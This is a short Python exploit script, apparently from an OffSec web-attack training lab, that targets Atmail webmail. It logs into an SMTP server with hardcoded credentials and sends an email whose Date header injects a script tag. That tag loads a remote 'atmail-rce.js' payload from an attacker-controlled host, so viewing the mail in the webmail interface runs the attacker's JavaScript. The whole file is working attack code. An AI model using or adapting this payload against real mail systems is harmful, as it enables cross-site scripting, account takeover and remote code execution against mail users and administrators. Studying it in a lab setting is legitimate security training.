#!/usr/bin/python
import smtplib, urllib2, sys
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
    msg  = "From: admin@offsec.local\n"
    msg += "To: admin@offsec.local\n"
    msg += 'Date: <script src="http://172.16.164.1/~awae/atmail-rce.js"></script>\n'
    msg += "Subject: You haz been pwnd\n"
    msg += "Content-type: text/html\n\n"
    msg += "Oh noez, you been had."
    msg += '\r\n\r\n'
    server = smtplib.SMTP(smtpsrv)
    server.login(username,password)
    try:
        server.sendmail(frmemail, dstemail, msg)
    except Exception, e:
        print "[-] Failed to send email:"
        print "[*] " + str(e)
    server.quit()
 
username = "admin@offsec.local"
password = "123456"
dstemail = "admin@offsec.local"
frmemail = "admin@offsec.local"
smtpsrv  = "172.16.164.147"
 
if not (dstemail and frmemail and smtpsrv):
   sys.exit()
 
sendMail(dstemail, frmemail, smtpsrv, username, password)
